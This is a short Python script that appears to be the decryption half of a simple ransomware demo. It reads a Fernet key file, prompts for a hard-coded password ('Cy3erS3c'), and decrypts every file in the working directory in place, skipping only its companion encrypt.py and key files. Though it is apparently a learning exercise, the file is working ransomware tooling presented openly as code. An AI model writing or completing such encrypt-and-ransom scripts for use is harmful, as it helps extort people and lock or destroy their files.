import os
from cryptography.fernet import Fernet

files = []

for file in os.listdir():
    if file == "encrypt.py" or file == "thekey.key" or file == "decrypt.py" or file=="decrypt":
        continue
    if os.path.isfile(file):
        files.append(file)
print("decrypted files", files)

with open("thekey.key", "rb") as key:
    _secret_key = key.read()
pass_phrase = "Cy3erS3c"
user_password = input("Enter the password to decrypted your files: ")
if user_password == pass_phrase:
    for file in files:
        with open(file, "rb") as thefile:
            content = thefile.read()
        content_decrypt = Fernet(_secret_key).decrypt(content)
        with open(file, "wb") as thefile:
            thefile.write(content_decrypt)
    print("you recovered all your files")
else:
    print("Enter the right password")
    
